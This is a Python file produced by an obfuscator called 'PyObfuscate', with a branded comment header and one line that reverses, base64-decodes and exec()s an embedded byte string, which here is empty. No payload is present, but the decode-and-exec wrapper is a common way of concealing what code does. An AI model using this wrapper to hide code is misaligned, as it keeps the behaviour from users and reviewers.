# Obfuscated with PyObfuscate
#ENCRYPTED BY :ANONYMOUS U7P4L
#VERSION :ALPHA
#GITHUB : https://github.com/U7P4L-IN
#FEEL THE POWER OF U7P4L...
# Time : Thu Jun  1 18:24:02 2023
# -------------------------------
###------------------------------MAIN>MENU-----------------------------###

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))